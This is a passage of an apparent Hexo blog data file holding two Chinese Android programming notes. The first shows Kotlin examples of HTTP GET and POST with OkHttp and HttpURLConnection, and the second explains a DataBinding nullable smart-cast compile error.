URL(\"https://www.baidu.com\")\n                connection = url.openConnection() as HttpURLConnection\n                connection.connectTimeout = 8000\n                connection.readTimeout = 8000\n                val input = connection.inputStream\n                val reader = BufferedReader(InputStreamReader(input))\n                reader.use {\n                    reader.forEachLine {\n                        response.append(it)\n                    }\n                }\n                // 切回主协程，这样做是因为Dispatcher.IO的协程其实不隶属于主线程\n                withContext(Dispatchers.Main) {\n                    binding.responseText.text = response.toString()\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            } finally {\n                connection?.disconnect()\n            }\n        }\n    }\n~~~\n\n\n\n","source":"_posts/okhttp-usage.md","raw":"---\ntitle: OKHttp/HttpURLConnection使用笔记\ndate: 2021-11-14\nauthor: 寒雨\nhide: false\nsummary: OKHttp/HttpURLConnection使用笔记\ncategories: 笔记\ntags:\n  - Kotlin\n  - 网络操作\n  - 外部库\n---\n\n# OKHttp/HttpURLConnection使用笔记\n\n废话不多说，上代码\n\n~~~kotlin\n    // 使用OKHttp提交数据\n    private fun okHttpPost() {\n        coroutineScope.launch(Dispatchers.IO) {\n            val requestBody = FormBody.Builder()\n                .add(\"user\", \"admin\")\n                .add(\"password\", \"123456\")\n                .build()\n            val request = Request.Builder()\n                .url(\"https://www.baidu.com\")\n                .post(requestBody)\n                .build()\n            // 之后操作跟拉取数据一样\n        }\n    }\n\n    // 使用OKHttp拉取数据\n    // 比HttpUrlConnection好使多了\n    private fun okHttpPull() {\n        coroutineScope.launch(Dispatchers.IO) {\n            try {\n                val client = OkHttpClient()\n                val request = Request.Builder()\n                    .url(\"https://www.baidu.com\")\n                    .build()\n                val response = client.newCall(request).execute()\n                val data = response.body?.string()\n                if (data != null) {\n                    withContext(Dispatchers.Main) {\n                        binding.responseText.text = data\n                    }\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            }\n        }\n    }\n\n    // 使用HttpURLConnection提交数据\n    private fun httpUrlConnectionPost() {\n        val connection: HttpURLConnection? = null\n        // 网络请求操作 拿到connection\n        connection!!.requestMethod = \"POST\"\n        val output = DataOutputStream(connection.outputStream)\n        output.writeBytes(\"username=admin&password=123456\")\n    }\n\n    // 使用HttpURLConnection拉取数据\n    private fun httpUrlConnectionPull() {\n        // 即使使用协程，网络操作也不能在主线程上运行，需要使用Dispatchers.IO\n        coroutineScope.launch(Dispatchers.IO) {\n            var connection: HttpURLConnection? = null\n            try {\n                val response = StringBuilder()\n                val url = URL(\"https://www.baidu.com\")\n                connection = url.openConnection() as HttpURLConnection\n                connection.connectTimeout = 8000\n                connection.readTimeout = 8000\n                val input = connection.inputStream\n                val reader = BufferedReader(InputStreamReader(input))\n                reader.use {\n                    reader.forEachLine {\n                        response.append(it)\n                    }\n                }\n                // 切回主协程，这样做是因为Dispatcher.IO的协程其实不隶属于主线程\n                withContext(Dispatchers.Main) {\n                    binding.responseText.text = response.toString()\n                }\n            } catch (e: Exception) {\n                e.printStackTrace()\n            } finally {\n                connection?.disconnect()\n            }\n        }\n    }\n~~~\n\n\n\n","slug":"okhttp-usage","published":1,"updated":"2022-11-24T02:49:32.232Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtr0022sfkl1hq5boc3","content":"<h1 id=\"OKHttp-x2F-HttpURLConnection使用笔记\"><a href=\"#OKHttp-x2F-HttpURLConnection使用笔记\" class=\"headerlink\" title=\"OKHttp/HttpURLConnection使用笔记\"></a>OKHttp/HttpURLConnection使用笔记</h1><p>废话不多说，上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 使用OKHttp提交数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">val</span> requestBody <span class=\"token operator\">=</span> FormBody<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>requestBody<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 之后操作跟拉取数据一样</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 使用OKHttp拉取数据</span>\n<span class=\"token comment\">// 比HttpUrlConnection好使多了</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> client <span class=\"token operator\">=</span> <span class=\"token function\">OkHttpClient</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>body<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 使用HttpURLConnection提交数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">val</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n    <span class=\"token comment\">// 网络请求操作 拿到connection</span>\n    connection<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>requestMethod <span class=\"token operator\">=</span> <span class=\"token string\">\"POST\"</span>\n    <span class=\"token keyword\">val</span> output <span class=\"token operator\">=</span> <span class=\"token function\">DataOutputStream</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">.</span>outputStream<span class=\"token punctuation\">)</span>\n    output<span class=\"token punctuation\">.</span><span class=\"token function\">writeBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username=admin&amp;password=123456\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// 使用HttpURLConnection拉取数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 即使使用协程，网络操作也不能在主线程上运行，需要使用Dispatchers.IO</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">var</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> <span class=\"token function\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> url <span class=\"token operator\">=</span> <span class=\"token function\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            connection <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HttpURLConnection\n            connection<span class=\"token punctuation\">.</span>connectTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            connection<span class=\"token punctuation\">.</span>readTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>inputStream\n            <span class=\"token keyword\">val</span> reader <span class=\"token operator\">=</span> <span class=\"token function\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token function\">InputStreamReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            reader<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span>\n                reader<span class=\"token punctuation\">.</span><span class=\"token function\">forEachLine</span> <span class=\"token punctuation\">{</span>\n                    response<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">// 切回主协程，这样做是因为Dispatcher.IO的协程其实不隶属于主线程</span>\n            <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n            connection<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">disconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"OKHttp-x2F-HttpURLConnection使用笔记\"><a href=\"#OKHttp-x2F-HttpURLConnection使用笔记\" class=\"headerlink\" title=\"OKHttp&#x2F;HttpURLConnection使用笔记\"></a>OKHttp&#x2F;HttpURLConnection使用笔记</h1><p>废话不多说，上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 使用OKHttp提交数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">val</span> requestBody <span class=\"token operator\">=</span> FormBody<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"user\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"admin\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span>requestBody<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\">// 之后操作跟拉取数据一样</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 使用OKHttp拉取数据</span>\n<span class=\"token comment\">// 比HttpUrlConnection好使多了</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">okHttpPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> client <span class=\"token operator\">=</span> <span class=\"token function\">OkHttpClient</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> request <span class=\"token operator\">=</span> Request<span class=\"token punctuation\">.</span><span class=\"token function\">Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span><span class=\"token function\">newCall</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> <span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>body<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> <span class=\"token keyword\">data</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 使用HttpURLConnection提交数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPost</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n    <span class=\"token comment\">// 网络请求操作 拿到connection</span>\n    connection<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>requestMethod <span class=\"token operator\">=</span> <span class=\"token string\">\"POST\"</span>\n    <span class=\"token keyword\">val</span> output <span class=\"token operator\">=</span> <span class=\"token function\">DataOutputStream</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">.</span>outputStream<span class=\"token punctuation\">)</span>\n    output<span class=\"token punctuation\">.</span><span class=\"token function\">writeBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username=admin&amp;password=123456\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 使用HttpURLConnection拉取数据</span>\n<span class=\"token keyword\">private</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">httpUrlConnectionPull</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 即使使用协程，网络操作也不能在主线程上运行，需要使用Dispatchers.IO</span>\n    coroutineScope<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>IO<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> connection<span class=\"token operator\">:</span> HttpURLConnection<span class=\"token operator\">?</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">val</span> response <span class=\"token operator\">=</span> <span class=\"token function\">StringBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">val</span> url <span class=\"token operator\">=</span> <span class=\"token function\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">)</span>\n            connection <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">openConnection</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HttpURLConnection\n            connection<span class=\"token punctuation\">.</span>connectTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            connection<span class=\"token punctuation\">.</span>readTimeout <span class=\"token operator\">=</span> <span class=\"token number\">8000</span>\n            <span class=\"token keyword\">val</span> input <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span>inputStream\n            <span class=\"token keyword\">val</span> reader <span class=\"token operator\">=</span> <span class=\"token function\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token function\">InputStreamReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            reader<span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span>\n                reader<span class=\"token punctuation\">.</span><span class=\"token function\">forEachLine</span> <span class=\"token punctuation\">&#123;</span>\n                    response<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span>it<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token comment\">// 切回主协程，这样做是因为Dispatcher.IO的协程其实不隶属于主线程</span>\n            <span class=\"token function\">withContext</span><span class=\"token punctuation\">(</span>Dispatchers<span class=\"token punctuation\">.</span>Main<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                binding<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">.</span>text <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> Exception<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">&#123;</span>\n            connection<span class=\"token operator\">?</span><span class=\"token punctuation\">.</span><span class=\"token function\">disconnect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n"},{"title":"在DataBinding的使用过程中踩的坑","date":"2021-11-21T16:00:00.000Z","author":"寒雨","hide":false,"summary":"DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红","_content":"\n# 在DataBinding的使用过程中踩的坑\n\n今天初次尝试了DataBinding，之前一直在用ViewBinding。今天欣喜的发现DataBinding包含了ViewBinding的全部功能，绝绝子。\n\nDataBinding对于基于MVVM架构理念设计的Android程序来说非常有意义，它可以进一步解耦。\n\n不说了，来看看我今天遇到的具体问题\n\n> DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红\n\n我在布局文件activity_login.xml中给布局绑定了这样一个变量\n\n~~~xml\n    <data>\n        <variable\n            name=\"viewModel\"\n            type=\"kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel\" />\n    </data>\n~~~\n\n如你所见，我在代码中准备使用它\n\n~~~kotlin\nbinding.viewModel.postLogin()\n~~~\n\n这行代码在IDE中并没有标红，但无法通过编译\n\n~~~\ne: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression\n~~~\n\n遇事不决问度娘，于是在百度上找到了答案 ([在Kotlin中无法进行Smart Cast - Javaer101](https://www.javaer101.com/article/52202734.html))\n\n原来这个viewModel变量的类型实际上是LoginViewModel?，也就是它是允许为空的。而我获取的时候是直接以LoginViewModel的形式获取，它没有办法从LoginViewModel?类型smart cast为LoginViewModel。\n\n那么在调用的时候后面加个?就解决了。\n\n~~~kotlin\nbinding.viewModel?.postLogin()\n~~~\n\n之所以记录下来，是因为Android Studio没有给之前错误的用法标红，我觉得这个还是应该标个红的。\n\n","source":"_posts/problem-databinding.md","raw":"---\ntitle: 在DataBinding的使用过程中踩的坑\ndate: 2021-11-22\nauthor: 寒雨\nhide: false\nsummary: DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红\ncategories: 笔记\ntags:\n  - Android\n  - Kotlin\n---\n\n# 在DataBinding的使用过程中踩的坑\n\n今天初次尝试了DataBinding，之前一直在用ViewBinding。今天欣喜的发现DataBinding包含了ViewBinding的全部功能，绝绝子。\n\nDataBinding对于基于MVVM架构理念设计的Android程序来说非常有意义，它可以进一步解耦。\n\n不说了，来看看我今天遇到的具体问题\n\n> DataBinding可能会导致Kotlin编译器无法smart cast, 而IDE不会标红\n\n我在布局文件activity_login.xml中给布局绑定了这样一个变量\n\n~~~xml\n    <data>\n        <variable\n            name=\"viewModel\"\n            type=\"kim.bifrost.coldrain.wanandroid.viewmodel.LoginViewModel\" />\n    </data>\n~~~\n\n如你所见，我在代码中准备使用它\n\n~~~kotlin\nbinding.viewModel.postLogin()\n~~~\n\n这行代码在IDE中并没有标红，但无法通过编译\n\n~~~\ne: E:\\ColdRain_Moro\\AndroidProject\\WanAndroid\\app\\src\\main\\java\\kim\\bifrost\\coldrain\\wanandroid\\view\\activity\\LoginActivity.kt: (31, 13): Smart cast to 'LoginViewModel' is impossible, because 'binding.viewModel' is a complex expression\n~~~\n\n遇事不决问度娘，于是在百度上找到了答案 ([在Kotlin中无法进行Smart Cast - Javaer101](https://www.javaer101.com/article/52202734.html))\n\n原来这个viewModel变量的类型实际上是LoginViewModel?，也就是它是允许为空的。而我获取的时候是直接以LoginViewModel的形式获取，它没有办法从LoginViewModel?类型smart cast为LoginViewModel。\n\n那么在调用的时候后面加个?就解决了。\n\n~~~kotlin\nbinding.viewModel?.postLogin()\n~~~\n\n之所以记录下来，是因为Android 